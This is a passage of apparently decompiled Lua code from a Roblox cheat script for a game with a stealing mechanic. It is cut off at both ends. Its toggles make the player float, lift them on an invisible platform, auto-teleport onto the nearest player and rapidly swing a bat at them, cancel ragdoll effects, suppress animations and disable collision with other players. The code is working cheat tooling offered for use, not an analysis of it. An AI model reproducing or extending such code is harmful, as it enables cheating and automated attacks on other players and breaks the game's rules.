			n33 = 0
			flag13 = false
			n34 = 0
			n35 = 0
			n36 = 0
			v3 = nil
			local stopGrappleSpam = floatSpeedToolBridge.StopGrappleSpam

			if type(stopGrappleSpam) == "function" then
				stopGrappleSpam()
			end
		end

		local function fn7()
			if flag16 then
				return
			end
			flag16 = true

			task.defer(function()
				flag16 = false
				fn6()

				if floatToggle:Get() == true then
					floatToggle:Set(false, true)
				end
			end)
		end

		local function runUntilTimeout2(arg)
			if not flag12 or not arg or not arg.Parent then
				return
			end
			local now3 = os.clock()
			n35 = n32
			n34 = now3 + n27
			flag13 = true
			n36 = now3
		end

		local function fn8(arg, arg2)
			local assemblyLinearVelocity = arg.AssemblyLinearVelocity
			local flag17 = arg2.FloorMaterial ~= Enum.Material.Air
			local now3 = os.clock()

			if now3 - n36 >= n29 or flag13 and n34 - now3 <= n30 then
				runUntilTimeout2(arg)
			end

			if flag13 then
				if n34 <= now3 then
					flag13 = false
				else
					local n37 = (Workspace.Gravity - Workspace.Gravity) * n25
					arg.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y + (n35 - assemblyLinearVelocity.Y) * (1 - math.exp(-n28 * n25)) - n37, assemblyLinearVelocity.Z)
				end
			elseif not flag17 then
				local gravity = Workspace.Gravity

				if assemblyLinearVelocity.Y < 0 then
					gravity += n31
				end

				local n37 = gravity - Workspace.Gravity

				if math.abs(n37) > 0.001 then
					arg.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y - n37 * n25, assemblyLinearVelocity.Z)
				end
			end
		end

		local function fn9(arg)
			fn6()
			v3 = arg
			local startGrappleSpam = floatSpeedToolBridge.StartGrappleSpam

			if v3 and type(startGrappleSpam) == "function" and not startGrappleSpam(v3) then
				v3 = nil
			end

			flag12 = true
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

			if character_ then
				runUntilTimeout2(character_)
			end

			connection5 = RunService.Heartbeat:Connect(function(deltaTime)
				if flag12 then
					if flag15 and localPlayer:GetAttribute("Stealing") == true then
						fn7()
						return
					end
					local character_2 = localPlayer.Character
					local humanoidRootPart = character_2 and character_2:FindFirstChild("HumanoidRootPart")

					if humanoidRootPart then
						local humanoid = character_2:FindFirstChildOfClass("Humanoid")
						if humanoid and humanoid.Health <= 0 then
							fn7()
							return
						end
						local pulseGrapple = floatSpeedToolBridge.PulseGrapple

						if v3 and type(pulseGrapple) == "function" and not pulseGrapple(v3) then
							v3 = nil
						end

						n33 += deltaTime

						if not (n33 < n25) then
							local n37 = math.floor(n33 / n25)

							if n26 < n37 then
								n33 = 0
								n37 = 4
							else
								n33 -= n37 * n25
							end

							for idx = 1, n37 do
								fn8(humanoidRootPart, humanoid)
							end
						end
					end
				end
			end)
		end

		floatToggle = section:CreateToggle({
			Name = "Float",
			Default = false,
			Callback = function(arg)
				if arg then
					if flag15 and localPlayer:GetAttribute("Stealing") == true then
						fn7()
						return
					end
					local v4 = nil

					if flag14 then
						local equipSelected = floatSpeedToolBridge.EquipSelected

						if type(equipSelected) ~= "function" then
							uiLibrary.Notify("Tool unavailable", "The Speed Tool selection is not available right now.", 5)
							fn7()
							return
						end

						v4 = equipSelected()
						if not v4 then
							fn7()
							return
						end
					end

					fn9(v4)
				else
					fn6()
				end
			end,
		})

		section:CreateToggle({
			Name = "Auto Equip Speed Tool",
			Note = "Equips the current Speed Tool selection before Float starts.",
			Default = true,
			SubOf = floatToggle,
			Callback = function(arg)
				flag14 = arg == true
			end,
		})

		section:CreateToggle({
			Name = "Auto Off After Steal",
			Default = true,
			SubOf = floatToggle,
			Callback = function(arg)
				flag15 = arg == true

				if flag15 and flag12 and localPlayer:GetAttribute("Stealing") == true then
					fn7()
				end
			end,
		})

		fn(function()
			fn6()
		end)
	end
end

local brainrotEspSection, brainrotNotificationsSection, baseEspSection, fn2, fn3, disconnectAll, fn4, fn5, isBasePart, tbl3
local fn6, fn7, fn8, v, chilliBaseLockTimerRuntime, flag2, n, v2, folder, childMap
local connections, fn9, fn10, fn11

do
	do
		local n2 = 1
		local flag3 = false
		local connection = nil
		local part = nil
		local n3 = 5

		local function destroyAll()
			pcall(function()
				part:Destroy()
			end)

			part = nil
		end

		local function fn12()
			connection:Disconnect()
			connection = nil
			flag3 = false
			destroyAll()
		end

		local function createPart()
			if part.Parent then
				return part
			end
			destroyAll()
			local part2 = Instance.new("Part")
			part2.Name = generateRandomId()
			part2.Anchored = true
			part2.CanCollide = true
			part2.CanQuery = false
			part2.CanTouch = false
			part2.CastShadow = false
			part2.Massless = true
			part2.Size = Vector3.new(6, 1, 6)
			part2.Transparency = 1
			part2.Parent = Workspace
			part = part2
			return part2
		end

		local function fn13()
			fn12()
			flag3 = true

			connection = RunService.Heartbeat:Connect(function(deltaTime)
				if flag3 then
					local character_ = localPlayer.Character
					local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
					if not humanoidRootPart then
						destroyAll()
						return
					end
					local part2 = createPart()
					local n4 = math.min(deltaTime, 0.1) * n3
					local humanoid = character_:FindFirstChildOfClass("Humanoid")
					local n5 = 3.2

					if humanoid then
						n5 = humanoid.HipHeight + humanoidRootPart.Size.Y * 0.5
					end

					local n6 = humanoidRootPart.Position.Y - n5
					local y = part2.Position.Y
					local n7

					if math.abs(y + n2 * 0.5 - n6) > 6 then
						n7 = n6 - n2 * 0.5
					else
						n7 = y + n4
					end

					part2.CFrame = CFrame.new(humanoidRootPart.Position.X, n7, humanoidRootPart.Position.Z)
					local n8 = n7 + n2 * 0.5

					if n8 > n6 then
						local n9 = n8 + n5
						local n10 = humanoidRootPart.CFrame - humanoidRootPart.CFrame.Position
						humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, n9, humanoidRootPart.Position.Z) * n10
						local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
						humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
					end
				end
			end)
		end

		section:CreateSlider({
			Name = "Floor Push Speed",
			Min = 5,
			Max = 40,
			Default = 10,
			AllowDecimals = false,
			Increment = 1,
			Unit = " studs/s",
			Quick = false,
			SubOf = section:CreateToggle({
				Name = "Floor Push",
				Note = "Raises an invisible platform under you and carries you up with it.",
				Default = false,
				Callback = function(arg)
					if arg then
						fn13()
					else
						fn12()
					end
				end,
			}),
			Callback = function(arg)
				n3 = math.clamp(tonumber(arg) or 5, 5, 40)
			end,
		})
	end

	do
		local n2 = 0.01
		local flag3 = false
		local n3 = 50
		local connection = nil
		local connection2 = nil
		local v3 = nil
		local v4 = nil
		local autoRotate = true
		local tool = nil
		local v5 = nil
		local flag4 = false
		local flag5 = false
		local n4 = 0
		local weakCache2 = setmetatable({}, { __mode = "k" })

		local function fn12(arg)
			arg = arg and arg.Character
			local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")
			local humanoidRootPart

			if arg then
				humanoidRootPart = arg:FindFirstChild("HumanoidRootPart") or arg:FindFirstChild("UpperTorso") or arg:FindFirstChild("Torso")
			else
				humanoidRootPart = arg
			end

			if humanoid and humanoid.Health > 0 and humanoidRootPart then
				return arg, humanoid, humanoidRootPart
			end
		end

		local function fn13(arg)
			local huge = math.huge
			local v6 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local v7, v8, v9 = fn12(player)

					if v9 then
						local magnitude = (v9.Position - arg.Position).Magnitude

						if magnitude < huge then
							huge = magnitude
							v6 = v9
						end
					end
				end
			end

			return v6
		end

		local function fn14(arg)
			arg = arg and arg:FindFirstChildWhichIsA("Tool")
			if arg and arg.Name:lower():find("bat", 1, true) then
				return arg
			end
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			if backpack then
				for _, child in ipairs(backpack:GetChildren()) do
					if child:IsA("Tool") and child.Name:lower():find("bat", 1, true) then
						return child
					end
				end
			end
		end

		local function fn15(arg, arg2)
			local v6 = fn14(arg)

			if not v6 then
				if not flag5 then
					flag5 = true
					uiLibrary.Notify("Bat unavailable", "Bat was not found in your character or Backpack.", 5)
				end

				return nil
			end

			flag5 = false

			if v6.Parent ~= arg then
				local tool2 = arg:FindFirstChildWhichIsA("Tool")

				if tool2 and tool2 ~= v6 and not tool then
					tool = tool2
				end

				v5 = v6
				flag4 = true

				pcall(function()
					runUntilTimeout(1)
					arg2:EquipTool(v6)
				end)
			end

			return v6.Parent == arg and v6 or nil
		end

		local function fn16(arg)
			if not arg:IsA("BasePart") then
				return
			end

			if weakCache2[arg] == nil then
				weakCache2[arg] = arg.CanCollide
			end

			arg.CanCollide = false
		end

		local function fn17()
			for k, v6 in pairs(weakCache2) do
				if k.Parent then
					pcall(function()
						k.CanCollide = v6
					end)
				end

				weakCache2[k] = nil
			end
		end

		local function fn18(arg)
			if v3 ~= arg then
				connection2:Disconnect()
				connection2 = nil
				fn17()
				v3 = arg

				if arg then
					for _, descendant in ipairs(arg:GetDescendants()) do
						fn16(descendant)
					end

					connection2 = arg.DescendantAdded:Connect(function(descendant)
						fn16(descendant)
					end)

					return
				end
			end
		end

		local function fn19()
			local v42 = v4
			v4 = nil
			if not v42.Parent then
				return
			end

			pcall(function()
				v42.AutoRotate = autoRotate
				local physics = Enum.HumanoidStateType.Physics

				if v42:GetState() == physics then
					v42:ChangeState(Enum.HumanoidStateType.Freefall)
				end
			end)
		end

		local function fn20(arg)
			if v4 ~= arg then
				fn19()
				v4 = arg
				autoRotate = arg.AutoRotate
			end

			arg.AutoRotate = false
			local physics = Enum.HumanoidStateType.Physics

			if arg:GetState() ~= physics then
				arg:ChangeState(Enum.HumanoidStateType.Physics)
			end
		end

		local function fn21()
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local v6 = v5
			local tool2 = tool
			v5 = nil
			tool = nil
			if not flag4 or not character_ or not humanoid or humanoid.Health <= 0 then
				flag4 = false
				return
			end
			flag4 = false
			local tool3 = character_:FindFirstChildWhichIsA("Tool")
			if tool3 and tool3 ~= v6 then
				return
			end

			pcall(function()
				runUntilTimeout(0.5)

				if tool2 and tool2.Parent then
					humanoid:EquipTool(tool2)
				else
					humanoid:UnequipTools()
				end
			end)
		end

		local function fn22()
			flag3 = false
			n4 = 0
			flag5 = false
			connection:Disconnect()
			connection = nil
			connection2:Disconnect()
			connection2 = nil
			v3 = nil
			fn19()
			fn17()
			fn21()
		end

		local function fn23()
			fn22()
			flag3 = true

			connection = RunService.Heartbeat:Connect(function(deltaTime)
				local v6, v7, v8 = fn12(localPlayer)

				if not v6 or not v7 or not v8 then
					n4 = 0
					fn19()
					return
				end

				fn18(v6)
				local v9 = fn15(v6, v7)
				local v10 = fn13(v8)

				if not v10 then
					n4 = 0
					fn19()
					return
				end

				fn20(v7)
				local lookVector = v10.CFrame.LookVector
				local vector = Vector3.new(lookVector.X, 0, lookVector.Z)
				local vector2

				if vector.Magnitude <= 0.001 then
					vector2 = Vector3.new(0, 0, -1)
				else
					vector2 = vector.Unit
				end

				local position = v10.Position
				local n5 = position - v8.Position
				local magnitude = n5.Magnitude

				if magnitude > 0.001 then
					position = v8.Position + n5.Unit * math.min(magnitude, n3 * deltaTime)
				end

				v8.CFrame = CFrame.lookAt(position, position + vector2, Vector3.new(0, 1, 0))
				v8.AssemblyLinearVelocity = v10.AssemblyLinearVelocity
				v8.AssemblyAngularVelocity = Vector3.zero
				if not v9 then
					n4 = 0
					return
				end
				n4 += deltaTime
				local n6 = math.min(math.floor(n4 / n2), 6)

				if not (n6 <= 0) then
					n4 -= n6 * n2

					for idx = 1, n6 do
						pcall(function()
							v9:Deactivate()
							v9:Activate()
						end)
					end
				end
			end)
		end

		fn(fn22)

		section:CreateSlider({
			Name = "Follow Speed",
			DisplayName = "Follow Speed",
			SubOf = section:CreateToggle({
				Name = "Auto Hit Nearest Player",
				Default = false,
				Callback = function(arg)
					if arg then
						fn23()
					else
						fn22()
					end
				end,
			}),
			Min = 20,
			Max = 64,
			Default = 50,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				n3 = math.clamp(tonumber(arg) or 50, 20, 64)
			end,
		})
	end

	do
		local constraintFlags = { BallSocketConstraint = true, NoCollisionConstraint = true, HingeConstraint = true }

		local tbl4 = {
			[Enum.HumanoidStateType.Physics] = true,
			[Enum.HumanoidStateType.Ragdoll] = true,
			[Enum.HumanoidStateType.FallingDown] = true,
		}

		local n2 = 12
		local n3 = 5
		local n4 = 0
		local v3 = nil

		local ok, result = pcall(function()
			return require(ReplicatedStorage.Controllers.RagdollController)
		end)

		if ok then
			v3 = result
		end

		local v4 = nil

		local function getV5()
			return v4
		end

		local flag3 = false
		local connection = nil
		local n5 = 0
		local list = {}
		local list2 = {}
		local n6 = 0
		local v5 = nil
		local humanoid = nil

		local function disconnectAll2(arg)
			for _, v6 in ipairs(arg) do
				if v6.Connected then
					v6:Disconnect()
				end
			end

			table.clear(arg)
		end

		local function fn12(arg)
			list[#list + 1] = arg
		end

		local function fn13(arg)
			list2[#list2 + 1] = arg
		end

		local function fn14()
			if not (not v5 or not humanoid) then
				local humanoidRootPart = v5:FindFirstChild("HumanoidRootPart")

				if humanoidRootPart then
					local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
					local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
					local n7 = humanoid.WalkSpeed + n3
					local y = assemblyLinearVelocity.Y
					local flag4 = false

					if n7 < vector.Magnitude then
						vector = vector.Unit * n7
						flag4 = true
					end

					if n4 < y then
						y = n4
						flag4 = true
					end

					if flag4 then
						pcall(function()
							humanoidRootPart.AssemblyLinearVelocity = Vector3.new(vector.X, y, vector.Z)
						end)
					end
				end
			end
		end

		local function destroyAll()
			if not (not v5 or not v5.Parent) then
				for _, descendant in ipairs(v5:GetDescendants()) do
					if constraintFlags[descendant.ClassName] then
						pcall(function()
							descendant:Destroy()
						end)
					end
				end
			end
		end

		local function fn15()
			if not (not v5 or not v5.Parent) then
				for _, descendant in ipairs(v5:GetDescendants()) do
					if descendant:IsA("AnimationConstraint") and not descendant.Enabled then
						pcall(function()
							descendant.Enabled = true
						end)
					end
				end
			end
		end

		local function fn16()
			local v6 = getV5()

			if v6 and v6.controlsEnabled == false then
				pcall(function()
					v6:Enable()
				end)
			end
		end

		local function fn17()
			local currentCamera = Workspace.CurrentCamera

			if currentCamera and humanoid and currentCamera.CameraSubject ~= humanoid then
				pcall(function()
					currentCamera.CameraSubject = humanoid
				end)
			end
		end

		local function fn18()
			if not (not humanoid or not humanoid.Parent or humanoid.Health <= 0) then
				if tbl4[humanoid:GetState()] then
					pcall(function()
						humanoid:ChangeState(Enum.HumanoidStateType.Running)
					end)
				end

				if humanoid.PlatformStand then
					humanoid.PlatformStand = false
				end
			end
		end

		local function fn19()
			local ok2, result2 = pcall(function()
				return v3.IsInRagdoll()
			end)

			return ok2 and result2 == true
		end

		local function fn20()
			if connection then
				connection:Disconnect()
				connection = nil
			end
		end

		local function fn21()
			if not (not v5 or v5 ~= localPlayer.Character or not humanoid or not humanoid:IsDescendantOf(v5)) then
				n5 = os.clock() + n2

				if not connection then
					connection = RunService.Heartbeat:Connect(function()
						if v5 ~= localPlayer.Character or not humanoid or not humanoid:IsDescendantOf(v5) then
							fn20()
							return
						end
						fn14()
						destroyAll()
						fn15()
						fn18()
						fn16()
						fn17()

						if os.clock() > n5 or not fn19() then
							fn20()
						end
					end)

					return
				end
			end
		end

		local function fn22(arg)
			n6 += 1
			disconnectAll2(list2)
			fn20()
			v5 = arg
			humanoid = nil

			if arg then
				humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)

				if not (arg ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid")) then
					fn13(humanoid.StateChanged:Connect(function(old, new)
						if tbl4[new] then
							fn21()
						end
					end))

					fn13(arg.DescendantAdded:Connect(function(descendant)
						if constraintFlags[descendant.ClassName] then
							fn21()
						end
					end))

					fn17()

					if fn19() then
						fn21()
					end
				end
			end
		end

		local function fn23()
			flag3 = false
			n6 += 1
			fn20()
			disconnectAll2(list2)
			disconnectAll2(list)
			v5 = nil
			humanoid = nil
		end

		local function fn24()
			fn23()
			flag3 = true
			getV5()

			fn12(localPlayer.CharacterAdded:Connect(function(character_)
				if flag3 then
					task.defer(function()
						if flag3 and character_ == localPlayer.Character then
							fn22(character_)
						end
					end)
				end
			end))

			fn12(localPlayer.CharacterRemoving:Connect(function(character_)
				if flag3 and character_ == v5 then
					n6 += 1
					fn20()
					disconnectAll2(list2)
					v5 = nil
					humanoid = nil
				end
			end))

			fn12(localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
				if flag3 then
					fn21()
				end
			end))

			local packages = ReplicatedStorage:FindFirstChild("Packages")
			local net = packages and packages:FindFirstChild("Net")
			net = net and net:FindFirstChild("RE/CombatService/ApplyImpulse")

			if net then
				fn12(net.OnClientEvent:Connect(function()
					if flag3 then
						fn14()
						fn21()
					end
				end))
			end

			if localPlayer.Character then
				fn22(localPlayer.Character)
			end
		end

		fn(fn23)

		characterSection:CreateToggle({
			Name = "Anti Ragdoll",
			Default = true,
			Callback = function(arg)
				if arg then
					fn24()
				else
					fn23()
				end
			end,
		})
	end

	do
		local flag3 = false
		local n2 = 0
		local connection = nil
		local connection2 = nil
		local connection3 = nil
		local animator = nil
		local tbl4 = {}

		local function fn12(arg)
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChildWhichIsA("Tool")
			if not character_ or not character_:IsA("Tool") then
				return false
			end
			local animation = arg.Animation
			local str = string.lower(tostring(arg.Name or ""))
			local str2 = string.lower(tostring(animation and animation.Name or ""))
			local priority = arg.Priority
			local flag4 = priority == Enum.AnimationPriority.Action or priority == Enum.AnimationPriority.Action2 or priority == Enum.AnimationPriority.Action3 or priority == Enum.AnimationPriority.Action4
			local flag5 = string.find(str, "tool", 1, true) ~= nil or string.find(str, "paint", 1, true) ~= nil or string.find(str, "gun", 1, true) ~= nil or string.find(str2, "tool", 1, true) ~= nil or string.find(str2, "paint", 1, true) ~= nil or string.find(str2, "gun", 1, true) ~= nil
			return flag5 or flag4, flag5
		end

		local function fn13()
			connection3:Disconnect()
			connection3 = nil
		end

		local function fn14()
			connection:Disconnect()
			connection = nil
			connection2:Disconnect()
			connection2 = nil
		end

		local function fn15(arg, arg2)
			local v3 = tbl4[arg]

			if v3 then
				tbl4[arg] = nil

				if v3.WeightConnection then
					v3.WeightConnection:Disconnect()
				end

				if v3.StoppedConnection then
					v3.StoppedConnection:Disconnect()
				end

				if arg2 then
					pcall(function()
						if arg.IsPlaying then
							arg:AdjustWeight(v3.DesiredWeight, 0.1)
						end
					end)
				end
			end
		end

		local function fn16(arg)
			local ks = {}

			for k in pairs(tbl4) do
				ks[#ks + 1] = k
			end

			for _, v3 in ipairs(ks) do
				fn15(v3, arg)
			end
		end

		local function fn17(arg)
			local v3, v4 = fn12(arg)

			if v3 then
				if tbl4[arg] then
					fn15(arg, true)
				elseif v4 then
					pcall(function()
						if arg.IsPlaying and arg.WeightTarget <= 0 and arg.WeightCurrent <= 0.01 then
							arg:AdjustWeight(1, 0.05)
						end
					end)
				end
			elseif not tbl4[arg] then
				local n3 = 1

				pcall(function()
					if arg.WeightTarget > 0 then
						n3 = arg.WeightTarget
					elseif arg.WeightCurrent > 0 then
						n3 = arg.WeightCurrent
					end
				end)

				local tbl5 = { Applying = false, DesiredWeight = n3 }
				tbl4[arg] = tbl5

				tbl5.WeightConnection = arg:GetPropertyChangedSignal("WeightTarget"):Connect(function()
					if tbl5.Applying then
						return
					end

					if fn12(arg) then
						fn15(arg, true)
						return
					end

					pcall(function()
						local weightTarget = arg.WeightTarget

						if weightTarget > 0 then
							tbl5.DesiredWeight = weightTarget
						end

						tbl5.Applying = true
						arg:AdjustWeight(0, 0)
					end)

					tbl5.Applying = false
				end)

				tbl5.StoppedConnection = arg.Stopped:Connect(function()
					fn15(arg, false)
				end)

				tbl5.Applying = true

				pcall(function()
					arg:AdjustWeight(0, 0)
				end)

				tbl5.Applying = false
				return
			end
		end

		local function fn18(arg)
			if arg == animator then
				for _, playingAnimationTrack in ipairs(arg:GetPlayingAnimationTracks()) do
					fn17(playingAnimationTrack)
				end
			end
		end

		local function fn19(arg)
			fn13()
			fn14()
			fn16(arg)
			animator = nil
		end

		local function fn20(arg)
			n2 += 1

			task.spawn(function()
				local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)

				if not (arg ~= localPlayer.Character or not humanoid) then
					local animator2 = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator", 5)

					if not (arg ~= localPlayer.Character or not animator2) then
						fn19(false)
						animator = animator2
						fn18(animator2)

						connection3 = animator2.AnimationPlayed:Connect(function(arg2)
							if animator == animator2 then
								fn17(arg2)
							end
						end)

						local function fn21(child)
							if not child:IsA("Tool") then
								return
							end

							task.defer(function()
								if arg == localPlayer.Character and animator == animator2 then
									fn18(animator2)
								end
							end)
						end

						connection = arg.ChildAdded:Connect(fn21)
						connection2 = arg.ChildRemoved:Connect(fn21)
						return
					end
				end
			end)
		end

		local connection4 = localPlayer.CharacterAdded:Connect(function(character_)
			fn20(character_)
		end)

		fn(function()
			flag3 = false
			n2 += 1
			fn19(true)
			connection4:Disconnect()
			connection4 = nil
		end)

		characterSection:CreateToggle({
			Name = "No Animation",
			Default = true,
			Callback = function(arg)
				flag3 = arg == true

				if flag3 then
					local character_ = localPlayer.Character

					if character_ then
						fn20(character_)
					end
				else
					n2 += 1
					fn19(true)
				end
			end,
		})
	end

	do
		local flag3 = false
		local n2 = 0
		local v3 = nil
		local v4 = nil
		local v5 = nil
		local v6 = nil
		local tbl4 = {}
		local tbl5 = {}
		local weakCache2 = setmetatable({}, { __mode = "k" })

		local function fn12(arg, arg2)
			local v7 = weakCache2[arg]

			if v7 then
				weakCache2[arg] = nil

				if v7.CollisionConnection then
					v7.CollisionConnection:Disconnect()
				end

				if v7.DestroyingConnection then
					v7.DestroyingConnection:Disconnect()
				end

				if arg2 and arg.Parent then
					pcall(function()
						v7.Applying = true
						arg.CanCollide = v7.OriginalCanCollide
						v7.Applying = false
					end)
				end
			end
		end

		local function fn13(arg, arg2)
			if arg.DescendantAddedConnection then
				arg.DescendantAddedConnection:Disconnect()
				arg.DescendantAddedConnection = nil
			end

			if arg.DescendantRemovingConnection then
				arg.DescendantRemovingConnection:Disconnect()
				arg.DescendantRemovingConnection = nil
			end

			local character_ = arg.Character
			arg.Character = nil

			if character_ then
				local ks = {}

				for k in pairs(weakCache2) do
					if k:IsDescendantOf(character_) then
						ks[#ks + 1] = k
					end
				end

				for _, v7 in ipairs(ks) do
					fn12(v7, arg2)
				end
			end
		end

		local function fn14(arg, arg2)
			local v7 = tbl5[arg]
			if not v7 then
				return
			end
			tbl5[arg] = nil

			if v7.DestroyingConnection then
				v7.DestroyingConnection:Disconnect()
				v7.DestroyingConnection = nil
			end

			fn13(v7, arg2)
		end

		local function fn15(arg, arg2)
			local v7 = tbl4[arg]

			if v7 then
				tbl4[arg] = nil
				fn13(v7, arg2)

				if v7.CharacterAddedConnection then
					v7.CharacterAddedConnection:Disconnect()
				end

				if v7.CharacterRemovingConnection then
					v7.CharacterRemovingConnection:Disconnect()
				end

				if v7.WebConnection then
					v7.WebConnection:Disconnect()
				end

				if v7.WebTargetConnection then
					v7.WebTargetConnection:Disconnect()
				end
			end
		end

		local function fn16()
			flag3 = false
			n2 += 1
			v3:Disconnect()
			v3 = nil
			v4:Disconnect()
			v4 = nil
			v5:Disconnect()
			v5 = nil
			v6:Disconnect()
			v6 = nil
			local ks = {}

			for k in pairs(tbl4) do
				ks[#ks + 1] = k
			end

			for _, v7 in ipairs(ks) do
				fn15(v7, true)
			end

			local ks2 = {}

			for k in pairs(tbl5) do
				ks2[#ks2 + 1] = k
			end

			for _, v7 in ipairs(ks2) do
				fn14(v7, true)
			end

			local ks3 = {}

			for k in pairs(weakCache2) do
				ks3[#ks3 + 1] = k
			end

			for _, v7 in ipairs(ks3) do
				fn12(v7, true)
			end
		end

		local v7, v8, v9, v10, v11, v12

		local function fn17()
		end

		fn(fn16)

		characterSection:CreateToggle({
			Name = "Disable Player Collision",
			Note = "Lets you move through other players and player clones without being blocked.",
			Default = true,
			Callback = function(arg)
				if arg then
					fn17()
				else
					fn16()
				end
			end,
		})
	end

	local flag3
	flag3 = false
	local flag4
	flag4 = false
	local flag5
	flag5 = false
	local flag6
	flag6 = true
	local flag7
	flag7 = false
	local flag8
	flag8 = false
	local n2
	n2 = 0.09
	local n3
	n3 = 225
	local v3
	v3 = nil
	local v4
	v4 = nil
	local v5
	v5 = nil
	local n4, fn12

	do
		local v6 = nil
		local v7 = nil
		local n5 = 0
		n4 = 0
		local n6 = 0
		local tbl4 = {}
		local v8 = nil
		local v9 = nil
		local n7 = 0
		local n8 = 0
		local v10 = nil

		fn12 = function(arg)
			if arg and arg.Connected then
				arg:Disconnect()
			end
		end

		local function fn13()
			for _, v11 in ipairs(tbl4) do
				fn12(v11)
			end

			table.clear(tbl4)
		end

		local function fn14(arg)
			if not arg or tbl2.ProtectedHumanoid ~= arg or arg.Health <= 0 then
				return false
			end

			local ok, result = pcall(function()
				return arg.BreakJointsOnDeath == false and arg.RequiresNeck == false and arg:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
			end)

			return ok and result == true
		end

		local function fn15(arg, arg2)
			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("Weld") or descendant:IsA("WeldConstraint") then
					local part0 = descendant.Part0
					local part1 = descendant.Part1

					if not (part0 and not part0:IsDescendantOf(arg)) then
						local part = part1 and not part1:IsDescendantOf(arg)
						local v11 = nil
						local v12 = nil

						if part then
							local part2 = part0
							part0 = part1
							part1 = part2
						else
							part0 = v11
							part1 = v12
						end
					end

					if part0 and part0:IsA("BasePart") and part1 and part1:IsA("BasePart") and part1:IsDescendantOf(arg) and (part0.Position - arg2.Position).Magnitude <= 5 then
						return part0, part1
					end
				end
			end

			return nil
		end

		local function fn16(arg)
			if localPlayer:GetAttribute("Stealing") ~= true then
				return nil
			end
			local character_ = localPlayer.Character
			local v5s = { arg }

			if v4 and v4.Parent and v4 ~= arg then
				v5s[#v5s + 1] = v4
			end

			local huge = math.huge
			local child = nil

			for _, child2 in ipairs(Workspace:GetChildren()) do
				if child2:IsA("Model") and child2 ~= character_ and not Players:GetPlayerFromCharacter(child2) and child2.Name:sub(-6) ~= "_Clone" then
					local rootPart = child2:FindFirstChild("RootPart") or child2.PrimaryPart or child2:FindFirstChildWhichIsA("BasePart")

					if rootPart and rootPart:IsA("BasePart") then
						for idx, v11 in ipairs(v5s) do
							local v12, v13 = fn15(child2, v11)

							if v12 and v13 then
								local vector = v11.CFrame:PointToObjectSpace(v12.Position)
								local magnitude = (v13.Position - v11.Position).Magnitude

								if math.abs(vector.X) <= 5 and vector.Y >= -3 and vector.Y <= 7 and vector.Z >= -7 and vector.Z <= 4 and magnitude <= 14 then
									local n9 = (v12.Position - v11.Position).Magnitude + magnitude * 0.05 + (idx - 1) * 0.01

									if n9 < huge then
										huge = n9
										child = child2
									end
								end
							end
						end
					end
				end
			end

			return child
		end

		local function fn17()
			n7 += 1
			local n72 = n7
			v9 = nil
			v10 = nil
			if not flag or not flag4 or not flag8 or localPlayer:GetAttribute("Stealing") ~= true then
				return
			end

			task.spawn(function()
				while flag and n72 == n7 and flag4 and flag8 and localPlayer:GetAttribute("Stealing") == true do
					local character_ = localPlayer.Character
					character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

					if character_ then
						local v11 = fn16(character_)
						if v11 then
							v9 = v11
							return
						end
					end

					task.wait(0.15)
				end
			end)
		end

		local function fn18()
			local v52 = v5

			if not (not v4 or not v4:IsDescendantOf(game) or not v52) then
				if not (v52 ~= localPlayer.Character or v52.Parent ~= Workspace) then
					local ok = pcall(function()
						local model = Instance.new("Model")
						model.Parent = game
						v52.Parent = model
						v4.Parent = v52
						v52.PrimaryPart = v4
						v52.Parent = Workspace
						v4.CanCollide = true

						for _, descendant in ipairs(v52:GetDescendants()) do
							if descendant:IsA("Weld") or descendant:IsA("Motor6D") then
								if descendant.Part0 == v3 then
									descendant.Part0 = v4
								end

								if descendant.Part1 == v3 then
									descendant.Part1 = v4
								end
							end
						end

						if v3 then
							local cFrame = v3.CFrame
							v3:Destroy()
							v3 = nil
							v4.CFrame = cFrame
						end

						local humanoid = v52:FindFirstChildOfClass("Humanoid")

						if humanoid and v6 ~= nil then
							humanoid.HipHeight = v6
						end

						model:Destroy()
					end)

					if not ok and v4 and v4.Parent then
						pcall(function()
							v4:Destroy()
						end)
					end

					return ok
				end

				if v3 and v3.Parent then
					pcall(function()
						v3:Destroy()
					end)
				end

				if v4 and v4.Parent then
					pcall(function()
						v4:Destroy()
					end)
				end
			end

			return false
		end

		local flag9 = false

		local function fn19(arg)
			if arg ~= false then
				n4 += 1
				flag9 = false
			end

			n5 += 1
			n6 += 1
			flag4 = false
			n7 += 1
			v9 = nil
			v10 = nil
			n8 = 0
			v8 = nil

			if v7 then
				pcall(function()
					v7:Stop()
				end)

				pcall(function()
					v7:Destroy()
				end)

				v7 = nil
			end

			fn13()
			fn18()
			v3 = nil
			v4 = nil
			v5 = nil
			v6 = nil
		end

		local fn20 = nil
		local v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, v22, v23

		fn20 = function()
			return true
		end

		local function fn21(arg, arg2)
			n6 += 1
			local n62 = n6

			task.spawn(function()
				if arg2 and arg2 > 0 then
					task.wait(arg2)
				end

				for idx = 1, 50 do
